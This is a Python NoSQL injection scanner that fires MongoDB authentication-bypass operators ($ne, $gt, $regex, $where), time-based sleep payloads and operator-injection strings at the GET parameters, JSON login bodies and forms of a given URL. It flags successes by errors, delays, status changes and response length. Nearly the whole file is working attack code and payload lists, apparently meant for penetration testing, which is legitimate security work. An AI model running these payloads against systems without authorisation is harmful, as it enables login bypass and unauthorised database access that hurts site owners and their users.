#!/usr/bin/env python3
"""
NoSQL Injection Scanner
Tests for NoSQL injection vulnerabilities (MongoDB, CouchDB, etc.)
"""

import requests
import json
import urllib.parse
from datetime import datetime
from bs4 import BeautifulSoup

class NoSQLInjectionScanner:
    """NoSQL injection vulnerability scanner"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # NoSQL injection payloads
        self.payloads = {
            'mongodb_auth_bypass': [
                # Authentication bypass
                {'$ne': 'null'},
                {'$ne': ''},
                {'$ne': 1},
                {'$gt': ''},
                {'$gt': -1},
                {'$regex': '.*'},
                {'$regex': '^.*'},
                {'$exists': True},

                # Query operator injection
                {'$where': '1==1'},
                {'$where': 'sleep(5000)'},

                # Array injection
                {'$in': ['admin', 'user', 'test']},
                {'$nin': ['']},

                # Or operator
                {'$or': [{'password': {'$ne': ''}}, {'username': {'$ne': ''}}]},
            ],

            'mongodb_time_based': [
                # Time-based blind
                "';sleep(5000);var foo='",
                "';var start = new Date().getTime(); while(new Date().getTime() < start + 5000);var foo='",
                {'$where': 'sleep(5000)'},
            ],

            'string_injection': [
                # String-based NoSQL injection
                "' || '1'=='1",
                "' || 1==1//",
                "' || 1==1%00",
                "admin' || '1'=='1",
                "' || ''=='",

                # Bypass with comments
                "' || '1'=='1'//",
                "' || '1'=='1'/*",

                # Boolean-based
                "true, $where: '1 == 1'",
                ", $where: '1 == 1'",
                "$where: '1 == 1'",
            ],

            'operator_injection': [
                # Operator injection in URL parameters
                '[$ne]=',
                '[$gt]=',
                '[$gte]=',
                '[$lt]=',
                '[$lte]=',
                '[$regex]=.*',
                '[$exists]=true',
                '[$type]=2',
                '[$where]=1==1',
                '[$eq]=admin',
            ],

            'json_injection': [
                # JSON payload injection
                '{"$ne": null}',
                '{"$ne": ""}',
                '{"$gt": ""}',
                '{"$regex": ".*"}',
                '{"$where": "1==1"}',
            ]
        }

        # Error patterns indicating NoSQL injection
        self.error_patterns = [
            'MongoError',
            'MongoDB',
            'CouchDB',
            'NoSQL',
            'Cassandra',
            'Redis',
            'invalid operator',
            'unknown operator',
            '\$where',
            '\$regex',
            'BSON',
            'Object.keys',
            'TypeError: Cannot',
            'SyntaxError:',
            'JSON.parse',
        ]

        # Positive response indicators
        self.success_indicators = [
            'welcome',
            'dashboard',
            'admin',
            'profile',
            'logged in',
            'authentication successful',
        ]

    def scan(self):
        """Run NoSQL injection scan"""
        print(f"[*] Starting NoSQL injection scan on {self.target_url}")

        # Test GET parameters
        self._test_get_parameters()

        # Test POST JSON
        self._test_post_json()

        # Test POST form data
        self._test_post_form()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_get_parameters(self):
        """Test GET parameters for NoSQL injection"""
        print("[*] Testing GET parameters...")

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            # Try common parameter names
            params = {
                'username': ['test'],
                'user': ['test'],
                'email': ['test@example.com'],
                'id': ['1'],
                'search': ['test'],
                'q': ['test']
            }

        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Get baseline response
        try:
            baseline = self.session.get(self.target_url, timeout=10)
            baseline_time = baseline.elapsed.total_seconds()
        except:
            baseline = None
            baseline_time = 0

        for param_name in params.keys():
            # Test operator injection
            for operator in self.payloads['operator_injection']:
                test_params = params.copy()

                # Try adding operator to parameter name
                modified_param = f"{param_name}{operator}"
                test_url = f"{base_url}?{modified_param}test"

                if self._test_payload(test_url, param_name, f"Operator: {operator}", 'GET', baseline, baseline_time):
                    return

            # Test string injection
            for payload in self.payloads['string_injection'][:8]:
                test_params = params.copy()
                test_params[param_name] = [payload]

                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{base_url}?{query_string}"

                if self._test_payload(test_url, param_name, payload, 'GET', baseline, baseline_time):
                    return

    def _test_post_json(self):
        """Test POST JSON for NoSQL injection"""
        print("[*] Testing POST JSON payloads...")

        # Common JSON bodies for authentication
        test_bodies = [
            {'username': 'admin', 'password': 'test'},
            {'email': 'test@example.com', 'password': 'test'},
            {'user': 'admin', 'pass': 'test'},
        ]

        # Get baseline
        try:
            baseline = self.session.post(
                self.target_url,
                json={'username': 'testuser', 'password': 'testpass'},
                timeout=10
            )
            baseline_time = baseline.elapsed.total_seconds()
        except:
            baseline = None
            baseline_time = 0

        for base_body in test_bodies:
            for field in base_body.keys():
                # Test MongoDB authentication bypass
                for payload in self.payloads['mongodb_auth_bypass'][:10]:
                    test_body = base_body.copy()
                    test_body[field] = payload

                    if self._test_json_payload(test_body, field, str(payload), baseline, baseline_time):
                        return

                # Test time-based injection
                for payload in self.payloads['mongodb_time_based']:
                    test_body = base_body.copy()
                    test_body[field] = payload

                    if self._test_json_payload(test_body, field, str(payload), baseline, baseline_time, time_based=True):
                        return

    def _test_post_form(self):
        """Test POST form data for NoSQL injection"""
        print("[*] Testing POST form data...")

        # Try to find forms on the page
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            if not forms:
                return

            for form in forms[:3]:  # Test first 3 forms
                inputs = form.find_all('input')
                form_data = {}

                for inp in inputs:
                    name = inp.get('name')
                    if name and inp.get('type') != 'submit':
                        form_data[name] = 'test'

                if not form_data:
                    continue

                # Get form action
                action = form.get('action', '')
                if action:
                    if action.startswith('http'):
                        form_url = action
                    else:
                        parsed = urllib.parse.urlparse(self.target_url)
                        form_url = f"{parsed.scheme}://{parsed.netloc}{action}"
                else:
                    form_url = self.target_url

                # Test operator injection in form fields
                for field in form_data.keys():
                    for operator in self.payloads['operator_injection'][:6]:
                        test_data = form_data.copy()
                        # Try parameter name modification
                        modified_field = f"{field}{operator}"
                        test_data_modified = {modified_field: 'test'}

                        try:
                            response = self.session.post(form_url, data=test_data_modified, timeout=10)
                            if self._check_nosql_vuln(response, field, f"Operator: {operator}", None, 0):
                                return
                        except:
                            pass

        except Exception as e:
            pass

    def _test_payload(self, url, param_name, payload, method, baseline, baseline_time):
        """Test single NoSQL payload"""
        try:
            response = self.session.get(url, timeout=10)
            return self._check_nosql_vuln(response, param_name, payload, baseline, baseline_time)
        except Exception as e:
            pass
        return False

    def _test_json_payload(self, json_body, field_name, payload, baseline, baseline_time, time_based=False):
        """Test JSON payload for NoSQL injection"""
        try:
            response = self.session.post(
                self.target_url,
                json=json_body,
                headers={'Content-Type': 'application/json'},
                timeout=15
            )
            return self._check_nosql_vuln(response, field_name, payload, baseline, baseline_time, time_based)
        except Exception as e:
            pass
        return False

    def _check_nosql_vuln(self, response, location, payload, baseline, baseline_time, time_based=False):
        """Check if NoSQL injection was successful"""

        # Check for time-based injection
        if time_based:
            response_time = response.elapsed.total_seconds()
            if response_time > 4:  # 5 second sleep with 1 second tolerance
                vuln = {
                    'type': 'NoSQL Injection (Time-Based Blind)',
                    'severity': 'high',
                    'url': self.target_url,
                    'location': location,
                    'payload': payload,
                    'evidence': f'Response time: {response_time:.2f}s (baseline: {baseline_time:.2f}s)',
                    'cwe': 'CWE-943',
                    'impact': 'Database manipulation, authentication bypass, data extraction'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Time-based NoSQL injection found in {location}")
                return True

        # Check for error messages
        for pattern in self.error_patterns:
            if pattern.lower() in response.text.lower():
                vuln = {
                    'type': 'NoSQL Injection (Error-Based)',
                    'severity': 'high',
                    'url': self.target_url,
                    'location': location,
                    'payload': payload,
                    'evidence': f'Error pattern found: {pattern}',
                    'cwe': 'CWE-943',
                    'impact': 'Information disclosure, possible database manipulation'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Error-based NoSQL injection found in {location}")
                return True

        # Check for authentication bypass
        if baseline and response.status_code != baseline.status_code:
            # Status code changed
            if response.status_code in [200, 302, 301]:
                # Check for success indicators
                for indicator in self.success_indicators:
                    if indicator in response.text.lower():
                        vuln = {
                            'type': 'NoSQL Injection (Authentication Bypass)',
                            'severity': 'critical',
                            'url': self.target_url,
                            'location': location,
                            'payload': payload,
                            'evidence': f'Status: {response.status_code}, Success indicator: {indicator}',
                            'cwe': 'CWE-943',
                            'impact': 'Complete authentication bypass, unauthorized access'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: NoSQL authentication bypass in {location}")
                        return True

        # Check for boolean-based injection (different response length)
        if baseline and abs(len(response.text) - len(baseline.text)) > 100:
            # Significant difference in response length
            vuln = {
                'type': 'NoSQL Injection (Boolean-Based)',
                'severity': 'high',
                'url': self.target_url,
                'location': location,
                'payload': payload,
                'evidence': f'Response length: {len(response.text)} (baseline: {len(baseline.text)})',
                'cwe': 'CWE-943',
                'impact': 'Data extraction through blind injection'
            }
            self.vulnerabilities.append(vuln)
            print(f"[!] Boolean-based NoSQL injection found in {location}")
            return True

        return False

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 nosql_injection.py <url>")
        print("\nExample:")
        print("  python3 nosql_injection.py https://example.com/login")
        print("  python3 nosql_injection.py https://example.com/api/users?id=1")
        print("\nTests for:")
        print("  - MongoDB authentication bypass")
        print("  - NoSQL operator injection ($ne, $gt, $regex, etc.)")
        print("  - Time-based blind NoSQL injection")
        print("  - Boolean-based blind injection")
        sys.exit(1)

    scanner = NoSQLInjectionScanner(sys.argv[1])
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")

    if len(results['vulnerabilities']) > 0:
        print(f"\n[!] NoSQL injection vulnerabilities detected!")
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
